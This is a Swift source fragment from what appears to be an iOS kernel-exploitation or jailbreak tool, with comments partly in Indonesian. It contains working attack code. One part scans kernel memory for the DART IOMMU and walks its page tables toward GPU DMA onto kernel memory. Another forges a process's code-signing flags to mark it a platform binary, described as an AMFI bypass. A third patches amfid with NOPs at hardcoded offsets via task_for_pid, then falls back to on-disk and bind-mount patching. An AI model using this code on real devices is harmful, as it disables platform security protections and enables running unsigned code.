        detail += "=== Step 1: Scan zone for IODARTMapper object ===\n"
        detail += "Looking for vtable in kext range: 0x\(String(format: "%llx", kextMin))-0x\(String(format: "%llx", kextMax))\n"
        detail += "Looking for MMIO ivar in IO range: 0x\(String(format: "%llx", ioMin))-0x\(String(format: "%llx", ioMax))\n\n"
        
        let ourProc = ds_get_our_proc()
        
        // Scan ±4MB around our proc (stays in same zone generation)
        let scanCenter = ourProc & ~UInt64(0xFFF)
        let scanStart = scanCenter &- 0x400000
        let scanEnd   = scanCenter &+ 0x400000
        
        detail += "Scan range: 0x\(String(format: "%llx", scanStart)) - 0x\(String(format: "%llx", scanEnd))\n"
        
        // Scan in 16-byte steps (IOKit objects are 16-byte aligned)
        var candidatesFound = 0
        
        for addr in stride(from: scanStart, to: scanEnd, by: 16) {
            guard addr >= safeZoneMin && addr < safeZoneMax else { continue }
            
            // Read potential vtable pointer
            let vtable = ds_kread64_safe(addr)
            
            // vtable must point into kext range
            guard vtable >= kextMin && vtable < kextMax else { continue }
            
            // Verify: vtable+0 should be a valid function pointer (also in kext range)
            let firstMethod = ds_kread64_safe(vtable)
            guard firstMethod >= kextMin && firstMethod < kextMax else { continue }
            
            // Now scan ivars at +0x40 to +0xC0 for MMIO VA
            var foundMmio: UInt64 = 0
            for ivarOff: UInt64 in stride(from: 0x40, to: 0xC0, by: 8) {
                let ivarAddr = addr + ivarOff
                guard ivarAddr >= safeZoneMin && ivarAddr < safeZoneMax else { continue }
                let ivar = ds_kread64_safe(ivarAddr)
                if ivar >= ioMin && ivar < ioMax {
                    foundMmio = ivar
                    break
                }
            }
            
            if foundMmio != 0 {
                candidatesFound += 1
                detail += "✅ Candidate at 0x\(String(format: "%llx", addr)):\n"
                detail += "   vtable=0x\(String(format: "%llx", vtable))\n"
                detail += "   MMIO VA=0x\(String(format: "%llx", foundMmio))\n"
                dartObjectAddr = addr
                dartMmioVA = foundMmio
                if candidatesFound >= 3 { break }  // take first good one
            }
        }
        
        detail += "\nCandidates found: \(candidatesFound)\n\n"
        
        // ============================================================
        // STEP 2: Read DART MMIO registers via KRW
        //
        // DART MMIO register layout (T8020/A12):
        //   +0x000: PARAMS1 — bits[27:24] = page_shift (12 for 4KB)
        //   +0x020: STREAM_COMMAND
        //   +0x034: STREAM_SELECT
        //   +0x040: ERROR status
        //   +0x060: CONFIG (bit[15] = LOCK)
        //   +0x0fc: STREAMS_ENABLE
        //   +0x100 + sid*4: TCR[sid] — bit[7]=TRANSLATE_ENABLE
        //   +0x200 + sid*16 + idx*4: TTBR[sid][idx] — bit[31]=VALID, bits[30:0]=PPN
        // ============================================================
        detail += "=== Step 2: Read DART MMIO registers ===\n"
        
        if dartMmioVA == 0 {
            // Fallback: try known A12 DART MMIO kernel VA
            // DART MMIO is mapped at a fixed offset from kernel base on A12
            // IODARTFamily maps it via ml_io_map during boot
            // Typical kernel IO mapping base: kernBase + ~0x1C000000
            // But this varies. Try scanning kernel __DATA for IO pointers.
            detail += "No DART object found via zone scan\n"
            detail += "Trying fallback: scan kernel __DATA for MMIO pointer\n\n"
            
            // Scan __DATA (safe region, below PPL at +0x8000)
            let dataBase = kernBase + 0x30dc000
            for off: UInt64 in stride(from: 0, to: 0x7000, by: 8) {
                let val = ds_kread64_safe(dataBase + off)
                if val >= ioMin && val < ioMax {
                    // Verify it looks like DART MMIO: PARAMS1 should have page_shift=12
                    let params1 = ds_kread32_safe(val)
                    let pageShift = (params1 >> 24) & 0xF
                    if pageShift == 12 || pageShift == 14 {
                        detail += "✅ DART MMIO via __DATA+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", val))\n"
                        detail += "   PARAMS1=0x\(String(format: "%08x", params1)) page_shift=\(pageShift)\n"
                        dartMmioVA = val
                        break
                    }
                }
            }
        }
        
        if dartMmioVA != 0 {
            detail += "DART MMIO VA: 0x\(String(format: "%llx", dartMmioVA))\n\n"
            
            // Read PARAMS1
            let params1 = ds_kread32_safe(dartMmioVA + 0x000)
            let pageShift = (params1 >> 24) & 0xF
            detail += "PARAMS1: 0x\(String(format: "%08x", params1)) (page_shift=\(pageShift))\n"
            
            // Read CONFIG
            let config = ds_kread32_safe(dartMmioVA + 0x060)
            let locked = (config >> 15) & 1
            detail += "CONFIG: 0x\(String(format: "%08x", config)) (locked=\(locked))\n"
            
            // Read STREAMS_ENABLE
            let streamsEn = ds_kread32_safe(dartMmioVA + 0x0fc)
            detail += "STREAMS_ENABLE: 0x\(String(format: "%08x", streamsEn))\n\n"
            
            // Read all TTBRs (4 SIDs × 4 TTBRs each)
            detail += "TTBR registers:\n"
            var validTTBRs: [(sid: Int, idx: Int, ppn: UInt64)] = []
            
            for sid in 0..<4 {
                for idx in 0..<4 {
                    let ttbrOff = UInt64(0x200 + sid * 16 + idx * 4)
                    let ttbrVal = ds_kread32_safe(dartMmioVA + ttbrOff)
                    if ttbrVal != 0 {
                        let valid = (ttbrVal >> 31) & 1
                        let ppn = UInt64(ttbrVal & 0x7FFFFFFF)
                        detail += "  TTBR[\(sid)][\(idx)] = 0x\(String(format: "%08x", ttbrVal))"
                        detail += " valid=\(valid) PPN=0x\(String(format: "%x", ppn))\n"
                        if valid == 1 && ppn >= 0x800000 && ppn < 0x900000 {
                            validTTBRs.append((sid: sid, idx: idx, ppn: ppn))
                        }
                    }
                }
            }
            
            detail += "\nValid TTBRs: \(validTTBRs.count)\n\n"
            
            // ============================================================
            // STEP 3: Walk L1→L2 tables from TTBR
            // TTBR PPN → L1 PA → physmap VA → read L1 entries
            // L1 entry → L2 PA → physmap VA → read L2 entries (leaf PTEs)
            // ============================================================
            if let firstTTBR = validTTBRs.first {
                detail += "=== Step 3: Walk L1→L2 from TTBR[\(firstTTBR.sid)][\(firstTTBR.idx)] ===\n"
                
                let l1PA = firstTTBR.ppn << 12
                let l1VA = l1PA &- gPhysBase &+ gVirtBase
                
                detail += "L1 PA: 0x\(String(format: "%llx", l1PA))\n"
                detail += "L1 VA (physmap): 0x\(String(format: "%llx", l1VA))\n\n"
                
                guard l1VA >= safeZoneMin && l1VA < safeZoneMax else {
                    detail += "⚠️ L1 VA outside safe zone — cannot walk\n"
                    detail += "L1 is in physmap region (0xffffffde...) — need extended bounds\n"
                    
                    // Try with extended bounds that include physmap region
                    let extMin: UInt64 = 0xffffffd000000000
                    let extMax: UInt64 = 0xffffffe500000000
                    
                    if l1VA >= extMin && l1VA < extMax {
                        detail += "L1 VA is in extended physmap range — attempting read\n"
                        let testRead = ds_kread64_safe(l1VA)
                        detail += "L1[0] test read: 0x\(String(format: "%llx", testRead))\n"
                        
                        if testRead != 0 && testRead & 1 == 1 {
                            confirmedDARTL1 = l1VA
                            detail += "✅ L1 readable! Walking entries...\n\n"
                            
                            for i in 0..<512 {
                                let entryAddr = l1VA + UInt64(i * 8)
                                let entry = ds_kread64_safe(entryAddr)
                                if entry == 0 { continue }
                                if entry & 1 == 1 {
                                    let l2PA = entry & 0x0000000FFFFFF000
                                    let l2VA = l2PA &- gPhysBase &+ gVirtBase
                                    if i < 8 {
                                        detail += "  L1[\(i)]: 0x\(String(format: "%016llx", entry)) → L2 PA=0x\(String(format: "%llx", l2PA))\n"
                                    }
                                    // Walk L2
                                    if l2VA >= extMin && l2VA < extMax {
                                        var l2Count = 0
                                        for j in 0..<512 {
                                            let l2e = ds_kread64_safe(l2VA + UInt64(j * 8))
                                            if l2e & 1 == 1 {
                                                let leafPA = l2e & 0x0000000FFFFFF000
                                                let iova = UInt64(i) << 21 | UInt64(j) << 12
                                                confirmedL2Entries.append((iova: iova, pa: leafPA))
                                                l2Count += 1
                                            }
                                        }
                                        if i < 4 { detail += "    L2 entries: \(l2Count)\n" }
                                    }
                                }
                            }
                        }
                    }
                    
                    if confirmedDARTL1 == 0 {
                        detail += "\nL1 not readable — DART tables in wired memory outside zone\n"
                        detail += "DART MMIO found ✅ — this is major progress!\n"
                        detail += "TTBR values read ✅ — we know L1 physical address\n"
                        detail += "Next: use physmap walk (exp 74 method) to read L1\n"
                    }
                    
                    // Still report MMIO success even if L1 walk failed
                    let success = dartMmioVA != 0
                    return ExperimentResult(name: "DART PTE Probe (Exp 78)", success: success, detail: detail, timestamp: Date())
                }
                
                // L1 VA is in safe zone — walk normally
                confirmedDARTL1 = l1VA
                var l1ValidEntries: [(idx: Int, entry: UInt64)] = []
                
                for i in 0..<512 {
                    let entryAddr = l1VA + UInt64(i * 8)
                    guard entryAddr >= safeZoneMin && entryAddr < safeZoneMax else { continue }
                    let entry = ds_kread64_safe(entryAddr)
                    if entry == 0 { continue }
                    if entry & 1 == 1 {
                        l1ValidEntries.append((idx: i, entry: entry))
                        if l1ValidEntries.count <= 8 {
                            let l2PA = entry & 0x0000000FFFFFF000
                            detail += "  L1[\(i)]: 0x\(String(format: "%016llx", entry)) → L2 PA=0x\(String(format: "%llx", l2PA))\n"
                        }
                    }
                }
                
                detail += "Valid L1 entries: \(l1ValidEntries.count)\n\n"
                
                // Walk L2 tables
                detail += "=== Step 4: Walk L2 tables ===\n"
                for (idx, entry) in l1ValidEntries.prefix(4) {
                    let l2PA = entry & 0x0000000FFFFFF000
                    let l2VA = l2PA &- gPhysBase &+ gVirtBase
                    
                    let extMin: UInt64 = 0xffffffd000000000
                    let extMax: UInt64 = 0xffffffe500000000
                    guard l2VA >= extMin && l2VA < extMax else {
                        detail += "L1[\(idx)] → L2 VA 0x\(String(format: "%llx", l2VA)) out of range\n"
                        continue
                    }
                    
                    var l2Count = 0
                    for j in 0..<512 {
                        let l2Addr = l2VA + UInt64(j * 8)
                        let l2e = ds_kread64_safe(l2Addr)
                        if l2e & 1 == 1 {
                            l2Count += 1
                            let leafPA = l2e & 0x0000000FFFFFF000
                            let iova = UInt64(idx) << 21 | UInt64(j) << 12
                            confirmedL2Entries.append((iova: iova, pa: leafPA))
                            if l2Count <= 3 {
                                detail += "  L2[\(j)]: PA=0x\(String(format: "%llx", leafPA)) IOVA=0x\(String(format: "%08x", iova))\n"
                            }
                        }
                    }
                    detail += "  L1[\(idx)] → \(l2Count) valid L2 entries\n"
                }
            }
        } else {
            detail += "❌ DART MMIO VA not found\n"
            detail += "IODARTMapper object not in scanned zone range\n"
            detail += "DART object may be in wired memory (outside zone allocator)\n\n"
            detail += "Alternative: read DART MMIO VA from kernel __DATA globals\n"
            detail += "IODARTFamily stores DART instance pointer in __DATA\n"
        }
        
        detail += "\nTotal IOVA→PA mappings: \(confirmedL2Entries.count)\n\n"
        
        // ============================================================
        // STEP 5: Analysis — DAPF constraints and next steps
        // ============================================================
        detail += "=== Step 5: Analysis ===\n"
        
        if dartMmioVA != 0 {
            detail += "✅ DART MMIO found at: 0x\(String(format: "%llx", dartMmioVA))\n"
        }
        if confirmedDARTL1 != 0 {
            detail += "✅ DART L1 table at: 0x\(String(format: "%llx", confirmedDARTL1))\n"
        }
        detail += "IOVA→PA mappings: \(confirmedL2Entries.count)\n\n"
        
        if !confirmedL2Entries.isEmpty {
            let pas = confirmedL2Entries.map { $0.pa }
            let minPA = pas.min() ?? 0
            let maxPA = pas.max() ?? 0
            
            detail += "PA range: 0x\(String(format: "%llx", minPA)) - 0x\(String(format: "%llx", maxPA))\n"
            detail += "Range size: \((maxPA - minPA) / 1024 / 1024) MB\n\n"
            
            let kernDataPA = (kernBase + 0x30dc000) &- gVirtBase &+ gPhysBase
            let pplDataPA = kernDataPA + 0x8000
            detail += "Kernel __DATA PA: 0x\(String(format: "%llx", kernDataPA))\n"
            detail += "PPL data PA: 0x\(String(format: "%llx", pplDataPA))\n"
            
            let kernInRange = kernDataPA >= minPA && kernDataPA <= maxPA
            detail += "Kernel PA in DART range: \(kernInRange)\n\n"
            
            if kernInRange {
                detail += "⚡⚡⚡ KERNEL PA IN DART RANGE — GPU DMA VIABLE! ⚡⚡⚡\n"
            }
            
            let maxIOVA = confirmedL2Entries.map { $0.iova }.max() ?? 0
            detail += "Free IOVA: 0x\(String(format: "%x", maxIOVA + 0x1000)) - 0xFFFFFFFF\n"
            detail += "\n🎯 NEXT: Write DART PTE at free IOVA → map target PA → GPU DMA\n"
        } else if dartMmioVA != 0 {
            detail += "DART MMIO readable but L1 tables not in zone range\n"
            detail += "Next: use physmap VA (gVirtBase formula) to read L1 directly\n"
            detail += "L1 PA known from TTBR — compute physmap VA and read\n"
        } else {
            detail += "DART object not found in ±4MB zone scan\n"
            detail += "Next: expand scan range or scan wired memory region\n"
        }
        
        let success = dartMmioVA != 0 || confirmedDARTL1 != 0 || !confirmedL2Entries.isEmpty
        return ExperimentResult(name: "DART PTE Probe (Exp 78)", success: success, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 83: CS Flags Bypass via Physmap

    /// Modifikasi cs_flags di proc_ro binary target via physmap VA.
    ///
    /// Strategi:
    ///   1. Cari proc binary target via procbyname (dari path basename)
    ///   2. Baca proc_ro pointer dari proc (off_proc_p_proc_ro)
    ///   3. Hitung physical address proc_ro → physmap VA
    ///   4. Baca cs_flags di proc_ro+0x1c via physmap VA
    ///   5. Tulis cs_flags |= CS_VALID | CS_PLATFORM_BINARY via physmap VA
    ///
    /// Kenapa physmap bypass KTRR:
    ///   - KTRR melindungi VA __DATA kernel (static mapping)
    ///   - proc_ro ada di zone allocator (heap), bukan __DATA
    ///   - Physmap adalah mapping BERBEDA dari physical memory yang sama
    ///   - Write via physmap VA tidak trigger KTRR protection
    ///
    /// cs_flags layout di proc_ro (iOS 18 / A12):
    ///   proc_ro+0x00: p_list (8B)
    ///   proc_ro+0x08: p_proc back pointer (8B)
    ///   proc_ro+0x10: p_ucred (8B)
    ///   proc_ro+0x18: pr_task (8B)
    ///   proc_ro+0x1c: p_csflags (4B) ← target
    ///
    /// Note: offset 0x1c sudah dikonfirmasi dari kode existing (dspmgr.swift readCSFlags).
    private func expCSFlagsBypass(targetBinary: String) -> ExperimentResult {
        let expName = "CS Flags Bypass (Exp 83)"
        var detail = "Experiment 83: CS Flags Bypass via Physmap\n"
        detail += "==========================================\n\n"

        // ── Prerequisite checks ──────────────────────────────────────
        guard PhysmapConstants.isVerified else {
            detail += "❌ Jalankan Physmap Verify (Exp 74) dulu.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        guard let physmap = PhysmapConstants.load() else {
            detail += "❌ Physmap constants tidak tersedia.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let gVirtBase = physmap.gVirtBase
        let gPhysBase = physmap.gPhysBase
        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n\n"

        // ── Step 1: Resolve target process ───────────────────────────
        // Ambil basename dari path (e.g. "/usr/bin/id" → "id")
        let procName = (targetBinary as NSString).lastPathComponent
        detail += "Target binary: \(targetBinary)\n"
        detail += "Process name: \(procName)\n\n"

        // Coba cari via procbyname dulu, fallback ke our proc untuk self-test
        var targetProc: UInt64 = 0
        var targetPid: Int32 = 0

        // Cari proses yang sedang berjalan dengan nama ini
        targetProc = mgr.findProc(name: procName)
        if targetProc == 0 {
            // Fallback: coba our own proc untuk self-test
            targetProc = ds_get_our_proc()
            targetPid = getpid()
            detail += "⚠️ Proses '\(procName)' tidak ditemukan — pakai our proc (self-test)\n"
            detail += "Our proc: 0x\(String(format: "%llx", targetProc)), PID: \(targetPid)\n\n"
        } else {
            targetPid = Int32(bitPattern: ds_kread32(targetProc + UInt64(off_proc_p_pid)))
            detail += "✅ Found proc: 0x\(String(format: "%llx", targetProc)), PID: \(targetPid)\n\n"
        }

        guard targetProc != 0 else {
            detail += "❌ Tidak bisa resolve target proc.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // ── Step 2: Read proc_ro pointer ─────────────────────────────
        detail += "=== Step 2: Read proc_ro ===\n"
        let procRoVA = ds_kread64(targetProc + UInt64(off_proc_p_proc_ro))
        detail += "proc_ro VA: 0x\(String(format: "%llx", procRoVA))\n"

        guard procRoVA != 0, isSafeKernelHeapKreadAddress(procRoVA) else {
            detail += "❌ proc_ro pointer tidak valid atau di luar zone allocator.\n"
            detail += "  Expected: 0xffffffdd... - 0xffffffe5...\n"
            detail += "  Got: 0x\(String(format: "%llx", procRoVA))\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Dump proc_ro untuk verifikasi layout
        detail += "proc_ro dump (first 0x30 bytes):\n"
        for off: UInt64 in stride(from: 0, to: 0x30, by: 8) {
            let v = ds_kread64(procRoVA + off)
            detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\n"
        }
        detail += "\n"

        // ── Step 3: Read cs_flags via heap KRW ───────────────────────
        detail += "=== Step 3: Read cs_flags ===\n"
        let csFlagsOffset: UInt64 = 0x1c
        let csFlagsVA = procRoVA + csFlagsOffset
        let csFlagsBefore = ds_kread32(csFlagsVA)
        detail += "cs_flags VA: 0x\(String(format: "%llx", csFlagsVA))\n"
        detail += "cs_flags (before): 0x\(String(format: "%08x", csFlagsBefore))\n"

        // Decode flags
        let flagNames: [(UInt32, String)] = [
            (0x00000001, "CS_VALID"),
            (0x00000002, "CS_ADHOC"),
            (0x00000004, "CS_GET_TASK_ALLOW"),
            (0x00000008, "CS_INSTALLER"),
            (0x00000010, "CS_FORCED_LV"),
            (0x00000020, "CS_INVALID_ALLOWED"),
            (0x00000040, "CS_HARD"),
            (0x00000080, "CS_KILL"),
            (0x00000100, "CS_CHECK_EXPIRATION"),
            (0x00000200, "CS_RESTRICT"),
            (0x00000400, "CS_ENFORCEMENT"),
            (0x00000800, "CS_REQUIRE_LV"),
            (0x00001000, "CS_ENTITLEMENTS_VALIDATED"),
            (0x00002000, "CS_NO_UNTRUSTED_HELPERS"),
            (0x00004000, "CS_DEBUGGED"),
            (0x00008000, "CS_SIGNED"),
            (0x00010000, "CS_DEV_CODE"),
            (0x00020000, "CS_DATAVAULT_CONTROLLER"),
            (0x00040000, "CS_ENTITLEMENT_FLAGS"),
            (0x00100000, "CS_PLATFORM_BINARY"),
            (0x00200000, "CS_PLATFORM_PATH"),
            (0x00400000, "CS_DEBUGGER"),
            (0x00800000, "CS_INSTALLER_SIGNED"),
            (0x01000000, "CS_RUNTIME"),
            (0x02000000, "CS_LINKER_SIGNED"),
            (0x04000000, "CS_ALLOWED_MACHO"),
            (0x08000000, "CS_EXEC_SET_HARD"),
            (0x10000000, "CS_EXEC_SET_KILL"),
            (0x20000000, "CS_EXEC_SET_ENFORCEMENT"),
            (0x40000000, "CS_EXEC_INHERIT_SIP"),
            (0x80000000, "CS_KILLED"),
        ]
        for (flag, name) in flagNames {
            if csFlagsBefore & flag != 0 {
                detail += "  ✓ \(name) (0x\(String(format: "%x", flag)))\n"
            }
        }
        detail += "\n"

        // ── Step 4: Compute physmap VA dari proc_ro physical address ──
        detail += "=== Step 4: Compute physmap VA ===\n"

        // proc_ro ada di zone allocator (heap), bukan __DATA
        // Untuk mendapat physical address: VA - gVirtBase + gPhysBase
        // Tapi gVirtBase adalah base physmap, bukan base zone allocator
        // Zone allocator VA range: 0xffffffdd... - 0xffffffe5...
        // Physical address = VA - gVirtBase + gPhysBase
        // (karena physmap maps physical memory starting at gPhysBase to VA gVirtBase)

        // Verifikasi: proc_ro VA harus dalam zone allocator range
        guard isSafeKernelHeapKreadAddress(procRoVA) else {
            detail += "❌ proc_ro VA 0x\(String(format: "%llx", procRoVA)) bukan di zone allocator\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Hitung physical address proc_ro
        // Zone allocator pages di-map oleh physmap: phys = VA - gVirtBase + gPhysBase
        let procRoPhys = procRoVA &- gVirtBase &+ gPhysBase
        detail += "proc_ro phys: 0x\(String(format: "%llx", procRoPhys))\n"

        // Verifikasi physical address masuk akal (DRAM range A12: 0x800000000 - 0x900000000)
        guard procRoPhys >= 0x800000000 && procRoPhys < 0xC00000000 else {
            detail += "❌ proc_ro phys 0x\(String(format: "%llx", procRoPhys)) di luar DRAM range\n"
            detail += "  Expected: 0x800000000 - 0xC00000000\n"
            detail += "  Kemungkinan gVirtBase salah — jalankan Exp 74 ulang\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Hitung physmap VA untuk cs_flags
        let csFlagsPhys = procRoPhys &+ csFlagsOffset
        let csFlagsPhysmapVA = csFlagsPhys &- gPhysBase &+ gVirtBase

        detail += "cs_flags phys: 0x\(String(format: "%llx", csFlagsPhys))\n"
        detail += "cs_flags physmap VA: 0x\(String(format: "%llx", csFlagsPhysmapVA))\n"

        // Verifikasi physmap VA aman untuk write
        guard isSafePhysmapKRWAddress(csFlagsPhysmapVA) else {
            detail += "❌ cs_flags physmap VA tidak aman untuk KRW\n"
            detail += "  Expected: 0xffffffdd... - 0xffffffe5...\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
        detail += "✅ Physmap VA valid untuk write\n\n"

        // ── Step 5: Verify read via physmap VA matches heap KRW ──────
        detail += "=== Step 5: Cross-verify physmap read ===\n"
        let csFlagsViaPhysmap = ds_kread32(csFlagsPhysmapVA)
        detail += "cs_flags via heap KRW:   0x\(String(format: "%08x", csFlagsBefore))\n"
        detail += "cs_flags via physmap VA: 0x\(String(format: "%08x", csFlagsViaPhysmap))\n"

        guard csFlagsViaPhysmap == csFlagsBefore else {
            detail += "❌ Mismatch! Physmap VA tidak menunjuk ke proc_ro yang sama.\n"
            detail += "  Kemungkinan gVirtBase tidak akurat — jalankan Exp 74 ulang.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
        detail += "✅ Cross-verify OK — physmap VA menunjuk ke proc_ro yang benar\n\n"

        // ── Step 6: Write cs_flags — direct heap KRW dulu, physmap sebagai fallback ──
        detail += "=== Step 6: Write cs_flags ===\n"

        let CS_VALID:           UInt32 = 0x00000001
        let CS_PLATFORM_BINARY: UInt32 = 0x00100000
        let CS_HARD:            UInt32 = 0x00000040
        let CS_KILL:            UInt32 = 0x00000080

        let newFlags = (csFlagsBefore | CS_VALID | CS_PLATFORM_BINARY) & ~(CS_HARD | CS_KILL)
        detail += "New cs_flags: 0x\(String(format: "%08x", newFlags))\n"
        detail += "  + CS_VALID (0x1)\n"
        detail += "  + CS_PLATFORM_BINARY (0x100000)\n"
        detail += "  - CS_HARD (0x40)\n"
        detail += "  - CS_KILL (0x80)\n\n"

        // Attempt 1: Direct heap KRW write (sama seperti dspmgr.setCSFlags)
        // proc_ro di zone allocator — ds_kwrite32 langsung ke heap VA
        detail += "Attempt 1: direct heap KRW (ds_kwrite32)...\n"
        ds_kwrite32(csFlagsVA, newFlags)
        let afterAttempt1 = ds_kread32(csFlagsVA)
        detail += "  cs_flags after heap write: 0x\(String(format: "%08x", afterAttempt1))\n"
        let heapWriteOK = afterAttempt1 == newFlags

        // Attempt 2: Physmap write (bypass zone RO protection jika ada)
        detail += "Attempt 2: physmap write (safeKwrite32Physmap)...\n"
        _ = safeKwrite32Physmap(csFlagsPhysmapVA, newFlags)
        let afterAttempt2heap = ds_kread32(csFlagsVA)
        let afterAttempt2phys = ds_kread32(csFlagsPhysmapVA)
        detail += "  cs_flags after physmap write (heap read):   0x\(String(format: "%08x", afterAttempt2heap))\n"
        detail += "  cs_flags after physmap write (physmap read): 0x\(String(format: "%08x", afterAttempt2phys))\n"
        let physmapWriteOK = afterAttempt2heap == newFlags || afterAttempt2phys == newFlags

        detail += "\nHeap write OK: \(heapWriteOK)\n"
        detail += "Physmap write OK: \(physmapWriteOK)\n\n"

        // ── Step 7: Verify write ──────────────────────────────────────
        detail += "=== Step 7: Verify write ===\n"
        let csFlagsAfterHeap = ds_kread32(csFlagsVA)
        let csFlagsAfterPhysmap = ds_kread32(csFlagsPhysmapVA)
        detail += "cs_flags after (heap KRW):   0x\(String(format: "%08x", csFlagsAfterHeap))\n"
        detail += "cs_flags after (physmap VA): 0x\(String(format: "%08x", csFlagsAfterPhysmap))\n"

        let writeVerified = heapWriteOK || physmapWriteOK
        if writeVerified {
            let finalFlags = csFlagsAfterHeap != csFlagsBefore ? csFlagsAfterHeap : csFlagsAfterPhysmap
            detail += "✅ Write berhasil!\n\n"
            detail += "=== HASIL ===\n"
            detail += "Binary: \(targetBinary)\n"
            detail += "PID: \(targetPid)\n"
            detail += "cs_flags: 0x\(String(format: "%08x", csFlagsBefore)) → 0x\(String(format: "%08x", finalFlags))\n"
            detail += "CS_PLATFORM_BINARY: \(finalFlags & CS_PLATFORM_BINARY != 0 ? "✅ SET" : "❌ NOT SET")\n"
            detail += "Metode: \(heapWriteOK ? "heap KRW" : "physmap")\n\n"
            detail += "→ Lanjut: jalankan ④ Test Binary Spawn untuk verifikasi AMFI bypass\n"
            detail += "→ Jika spawn berhasil tanpa SIGKILL = AMFI bypass confirmed!\n"
        } else {
            detail += "❌ Write tidak terverifikasi — proc_ro di-protect zone RO.\n"
            detail += "  Expected: 0x\(String(format: "%08x", newFlags))\n"
            detail += "  Got heap: 0x\(String(format: "%08x", csFlagsAfterHeap))\n"
            detail += "  Got physmap: 0x\(String(format: "%08x", csFlagsAfterPhysmap))\n\n"
            detail += "Diagnosis:\n"
            detail += "  proc_ro zone di iOS 18 di-protect hardware (zone_require_ro)\n"
            detail += "  Physmap write juga tidak efektif — physical page read-only\n"
            detail += "  Jalur selanjutnya: patch amfid memory untuk skip signature check\n"
        }

        return ExperimentResult(name: expName, success: writeVerified, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 84: amfid Patch via Physmap

    // MARK: - Exp 84 v2: amfid Patch via task_for_pid + mach_vm_write

    /// Exp 84 v2: Patch amfid dari launchd RC via task_for_pid.
    /// Hardcoded offsets dari on-device analysis.
    /// Semua 13 BL+CBNZ W0 target fungsi yang sama = signature check.
    /// Patch: NOP semua CBNZ W0 → amfid skip error branch → always allow.
    ///
    /// Flow:
    ///   1. Dari launchd RC, panggil task_for_pid(amfid_pid) → amfid task port
    ///   2. mach_vm_protect: make amfid __TEXT writable (VM_PROT_READ|WRITE|EXECUTE)
    ///   3. mach_vm_write: tulis NOP (0xD503201F) ke setiap CBNZ offset
    ///   4. Verify: mach_vm_read kembali untuk konfirmasi
    ///   5. Test spawn binary unsigned
    #if !DISABLE_REMOTECALL
    private func expAmfidPatchV2(rc: RemoteCall) -> ExperimentResult {
        let expName = "amfid Patch v2 (Exp 84)"
        var detail = "Experiment 84 v2: amfid Patch via task_for_pid\n"
        detail += "================================================\n\n"

        let mem = rc.trojanMem
        let mgr = dspmgr.shared

        // ── Hardcoded patch offsets (dari on-device analysis) ─────────
        // amfid __TEXT base: 0x100000000 (in-binary), runtime: 0x16cd60000
        // Semua offset relatif dari runtime __TEXT base
        let amfidTextOffsets: [UInt64] = [
            0x274c, 0x2764, 0x2c68, 0x2d68, 0x33c0,
            0x348c, 0x372c, 0x3a9c, 0x3f24, 0x4164,
            0x41ec, 0x4284, 0x431c,
        ]
        let NOP: UInt32 = 0xD503201F

        // ── Step 1: Find amfid PID ───────────────────────────────────
        detail += "=== Step 1: Find amfid ===\n"
        let amfidProc = mgr.findProc(name: "amfid")
        guard amfidProc != 0 else {
            detail += "❌ amfid tidak ditemukan.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
        detail += "amfid PID: \(amfidPid)\n\n"

        // ── Step 2: task_for_pid dari launchd ────────────────────────
        detail += "=== Step 2: task_for_pid(\(amfidPid)) ===\n"

        // task_for_pid(mach_task_self(), pid, &task_port)
        let taskSelf = RootExecutor.rcall(rc, "mach_task_self")
        let taskPortAddr = mem + 0x1A00
        rc[taskPortAddr].setValue32(0)

        let tfpRet = RootExecutor.rcall(rc, "task_for_pid", taskSelf, UInt64(amfidPid), taskPortAddr)
        let amfidTaskPort = rc[taskPortAddr].value32()
        detail += "task_for_pid ret: \(tfpRet) (0=success)\n"
        detail += "amfid task port: \(amfidTaskPort)\n"

        guard tfpRet == 0 && amfidTaskPort != 0 else {
            detail += "❌ task_for_pid gagal (ret=\(tfpRet)).\n\n"

            // ══════════════════════════════════════════════════════════
            // FALLBACK: Patch amfid binary ON-DISK
            // Tulis NOP ke /usr/libexec/amfid file langsung
            // Lalu kill amfid → launchd restart → patched version jalan
            // ══════════════════════════════════════════════════════════
            detail += "=== Fallback: Patch amfid ON-DISK ===\n"
            detail += "Strategi: tulis NOP ke file /usr/libexec/amfid, lalu kill amfid.\n"
            detail += "Launchd akan restart amfid dari disk → patched version.\n\n"

            let amfidPath = remote_alloc_str(rc, "/usr/libexec/amfid")
            let nopBuf = mem + 0x2000

            // Open amfid for read+write
            let fd = RootExecutor.rcall(rc, "open", amfidPath, UInt64(O_RDWR), 0)
            guard fd != UInt64(bitPattern: -1) else {
                let err = remote_errno(rc)
                detail += "❌ open(/usr/libexec/amfid, O_RDWR) gagal: errno=\(err)\n"
                if err == 1 { detail += "  EPERM — filesystem mungkin read-only (SSV/snapshot)\n" }
                if err == 30 { detail += "  EROFS — Read-only file system\n" }

                // ══════════════════════════════════════════════════════
                // FALLBACK 2: Copy amfid ke /var, patch, bind mount
                // /var is writable! Copy → patch → mount over original
                // ══════════════════════════════════════════════════════
                detail += "\n=== Fallback 2: Copy + Patch + Bind Mount ===\n"
                detail += "Rootfs read-only → copy amfid ke /var (writable), patch, bind mount.\n\n"

                let patchedPath = "/var/tmp/.amfid_patched"
                let patchedPathAddr = remote_alloc_str(rc, patchedPath)

                // Step A: Copy amfid ke /var/tmp
                detail += "Step A: Copy amfid ke \(patchedPath)...\n"
                RootExecutor.rcall(rc, "unlink", patchedPathAddr)

